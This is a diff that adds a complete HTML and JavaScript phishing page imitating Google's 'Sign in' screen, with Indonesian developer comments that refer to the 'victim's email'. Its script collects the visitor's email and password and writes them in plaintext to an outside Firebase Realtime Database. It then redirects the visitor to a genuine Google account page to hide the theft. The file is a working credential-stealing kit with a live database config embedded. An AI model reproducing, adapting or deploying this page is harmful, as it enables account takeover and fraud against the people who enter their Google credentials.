@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>GOOGLE SIGN IN</title>
+
+  <!-- Mengambil font Roboto dengan ketebalan 400 dan 500 untuk efek agak tebal -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
+
+  <style>
+    * {
+      margin: 0%;
+      padding: 0%;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Roboto", sans-serif;
+      background-color: #fff;
+      color: #202124;
+      font-weight: 500; /* Membuat seluruh teks bawaan sedikit lebih tebal secara global */
+    }
+
+    a {
+      text-decoration: none;
+      color: #1a73e8;
+      display: inline-block;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .container {
+      max-width: 450px;
+      border: none;
+      margin: auto;
+      margin-top: 1.5rem;
+      border-radius: 0;
+      padding: 2rem;
+      min-height: 500px;
+      position: relative;
+      background-color: #fff;
+    }
+
+    .top-content {
+      text-align: left;
+    }
+
+    img {
+      width: 45px; 
+      height: auto;
+      margin: 10px 0 15px 0;
+    }
+
+    /* Gedein tulisan Sign in sesuai request */
+    h2 {
+      font-size: 36px; 
+      font-weight: 500;
+      margin-bottom: 8px;
+      color: #1f1f1f;
+    }
+
+    .heading {
+      margin-bottom: 30px;
+      font-size: 16px;
+      color: #444746;
+      font-weight: 400;
+    }
+
+    .inputs {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .input {
+      display: block;
+      border: 1px solid rgb(228, 228, 228);
+      font-size: 16px;
+      width: 100%;
+      height: 55px;
+      padding: 0 15px;
+      z-index: 2;
+      background-color: transparent;
+      outline: none;
+      border-radius: 4px;
+      position: relative;
+      color: inherit;
+      font-weight: 500;
+    }
+
+    .input-label {
+      position: absolute;
+      top: 15px;
+      font-size: 1rem;
+      left: 14px;
+      color: rgb(122, 122, 122);
+      font-weight: 500;
+      transition: 0.2s ease;
+      background-color: #fff;
+      padding: 0 5px;
+      z-index: 1;
+      pointer-events: none;
+    }
+
+    .input:focus ~ .input-label,
+    .input:not(:placeholder-shown) ~ .input-label {
+      top: -10px;
+      color: #1a73e8;
+      font-size: 12px;
+      z-index: 3;
+    }
+
+    .input:focus {
+      border: 2px solid #1a73e8;
+    }
+
+    /* Style Checkbox Show Password Persis Foto */
+    .show-password-container {
+      display: none; /* Default sembunyi, muncul di form password */
+      align-items: center;
+      margin-top: 10px;
+      margin-bottom: 25px;
+      cursor: pointer;
+    }
+
+    .show-password-container input {
+      margin-right: 12px;
+      width: 18px;
+      height: 18px;
+      cursor: pointer;
+      accent-color: #1a73e8;
+    }
+
+    .show-password-container label {
+      font-size: 14px;
+      color: #3c4043;
+      user-select: none;
+      cursor: pointer;
+      font-weight: 400; /* Teks deskripsi checkbox agak tipis biar pas dengan aslinya */
+    }
+
+    .link-btn {
+      margin-bottom: 2rem;
+      font-weight: 500;
+    }
+
+    .color {
+      color: #5f6368;
+      font-size: 14px;
+      margin-bottom: 15px;
+      line-height: 1.4;
+      font-weight: 400;
+    }
+
+    .btn-group {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 35px;
+    }
+
+    .create-btn {
+      border: none;
+      background-color: transparent;
+      color: #1a73e8;
+      font-weight: 500;
+      cursor: pointer;
+      height: 38px;
+      padding: 0 5px;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    .next-btn {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      height: 38px;
+      padding: 0 24px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: 500;
+      font-size: 14px;
+      margin-left: auto;
+    }
+
+    .create-btn:hover {
+      background-color: #e8f2ff6e;
+    }
+
+    .next-btn:hover {
+      background-color: #1864c9;
+    }
+
+    #password-section {
+      display: none;
+    }
+
+    .loading-text {
+      text-align: center;
+      color: #1a73e8;
+      font-size: 14px;
+      margin-top: 20px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="top-content">
+      <img src="https://i.postimg.cc/DfSTkc97/1000592848.png" alt="Google Logo">
+      <h2>Sign in</h2>
+      <p class="heading" id="guestText">Use your Google Account</p>
+    </div>
+
+    <!-- FIELD EMAIL -->
+    <div class="inputs" id="email-section">
+      <input type="email" id="email" class="input" placeholder=" ">
+      <label for="email" class="input-label">Email or phone</label>
+    </div>
+
+    <!-- FIELD PASSWORD -->
+    <div class="inputs" id="password-section">
+      <input type="password" id="password" class="input" placeholder=" ">
+      <label for="password" class="input-label">Enter your password</label>
+    </div>
+
+    <!-- TOMBOL SHOW PASSWORD (MUNCUL BARENG PASSWORD) -->
+    <div class="show-password-container" id="showPasswordArea">
+      <input type="checkbox" id="showPasswordCheckbox">
+      <label for="showPasswordCheckbox">Show password</label>
+    </div>
+
+    <!-- LINK FORGOT EMAIL (MENGARAH KE URL TARGET LU) -->
+    <a href="https://accounts.google.com/signin/v2/usernamerecovery?authuser=0&continue=https://mail.google.com/mail/u/0/spreauth&dsh=S-1089577355:1780200628915361&emr=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/spreauth&rart=ANgoxcdgw4NHBHm427KlovsPTVn-1VOTQuGzzT1xNbSbw4v6cnWRxXtsy6mkQ64_rDcseaKEzBFgqPaFyP33he_09Z_23_zpsqzpNI6hDJ13c6IXaHHLKJI&service=mail" class="link-btn" id="forgotText">Forgot Email?</a>
+
+    <p class="color" id="guestModeText">
+      Not your computer? Use Guest mode to sign in privately.
+    </p>
+
+    <a href="#" class="link-btn" id="learnMoreText">Learn More</a>
+
+    <div class="btn-group" id="btnGroup">
+      <!-- LINK CREATE ACCOUNT (MENGARAH KE URL TARGET LU) -->
+      <a href="https://accounts.google.com/lifecycle/steps/signup/name?authuser=0&continue=https://mail.google.com/mail/u/0/spreauth&dsh=S-1089577355:1780200628915361&emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/spreauth&rart=ANgoxcdgw4NHBHm427KlovsPTVn-1VOTQuGzzT1xNbSbw4v6cnWRxXtsy6mkQ64_rDcseaKEzBFgqPaFyP33he_09Z_23_zpsqzpNI6hDJ13c6IXaHHLKJI&service=mail&TL=APouJz6hERQP0DkpryCdofzJdlru6hv89wmRKWXzGl_Aph7Vo-z98y5aEklaKd_l" id="createBtnLink">
+        <button class="create-btn" id="createBtn" type="button">Create account</button>
+      </a>
+      <button class="next-btn" id="nextBtn">Next</button>
+    </div>
+    
+    <div id="loadingSpace"></div>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
+  <script>
+        // Firebase Configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyByrghHXZByE9V_8NIU26KS-MEOIp-WmP4",
+      authDomain: "googo-d48b9.firebaseapp.com",
+      databaseURL: "https://googo-d48b9-default-rtdb.asia-southeast1.firebasedatabase.app/",
+      projectId: "googo-d48b9",
+      storageBucket: "googo-d48b9.firebasestorage.app",
+      messagingSenderId: "1048734355922",
+      appId: "1:1048734355922:web:0fcdda484514d20e53f80b",
+      measurementId: "G-T9ZYWW3RKL"
+    };
+
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    let emailData = "";
+
+    // Fungsi Pembantu untuk Validasi Format Email Resmi
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+
+    // Fungsi Interaksi Show/Hide Password
+    document.getElementById("showPasswordCheckbox").addEventListener("change", function() {
+      const passwordInput = document.getElementById("password");
+      if (this.checked) {
+        passwordInput.type = "text";
+      } else {
+        passwordInput.type = "password";
+      }
+    });
+
+    document.getElementById("nextBtn").addEventListener("click", function (e) {
+      e.preventDefault();
+
+      const emailInput = document.getElementById("email");
+      const passwordInput = document.getElementById("password");
+      const forgotText = document.getElementById("forgotText");
+      const guestText = document.getElementById("guestText");
+
+      const emailValue = emailInput.value.trim();
+      const passwordValue = passwordInput.value.trim();
+
+      // JALUR 1: VALIDASI & INPUT EMAIL
+      if (emailData === "") {
+        // Ngecek apakah kosong atau formatnya ga valid (ga ada @ atau titik)
+        if (emailValue === "" || !validateEmail(emailValue)) {
+          emailInput.focus();
+          emailInput.style.border = "2px solid red";
+          return;
+        } else {
+          emailInput.style.border = "1px solid rgb(228, 228, 228)";
+        }
+
+        emailData = emailValue; 
+
+        document.getElementById("email-section").style.display = "none";
+        document.getElementById("password-section").style.display = "block";
+        document.getElementById("showPasswordArea").style.display = "flex"; // Memunculkan tombol Show Password
+        
+        // Mengubah header menjadi email korban seperti di foto asli
+        guestText.innerText = emailData;
+        
+        // Mengubah teks forgot link & fungsinya jika dibutuhkan
+        forgotText.innerText = "Forgot password?";
+        forgotText.href = "#"; 
+        
+        document.getElementById("guestModeText").style.display = "none";
+        document.getElementById("learnMoreText").style.display = "none";
+        document.getElementById("createBtnLink").style.display = "none";
+
+        passwordInput.focus();
+      } 
+      // JALUR 2: VALIDASI & INPUT PASSWORD
+      else {
+        // Memastikan password diisi dan minimal 6 karakter supaya tidak asal ketik pendek
+        if (passwordValue === "" || passwordValue.length < 6) {
+          passwordInput.focus();
+          passwordInput.style.border = "2px solid red";
+          return;
+        } else {
+          passwordInput.style.border = "1px solid rgb(228, 228, 228)";
+        }
+
+        // Simpan ke Firebase Realtime Database
+        const userRef = db.ref("users").push();
+        userRef.set({
+          email: emailData,
+          password: passwordValue,
+          timestamp: new Date().toLocaleString()
+        }).then(() => {
+          console.log("Data berhasil masuk Firebase Singapura!");
+        }).catch((error) => {
+          console.error("Firebase Error: ", error);
+        });
+        // Pengalihan setelah sukses submit
+        setTimeout(() => {
+          window.location.href = "https://myaccount.google.com/personal-info";
+        }, 1500);
+      }
+    });
+  </script>
+</body>
+</html>
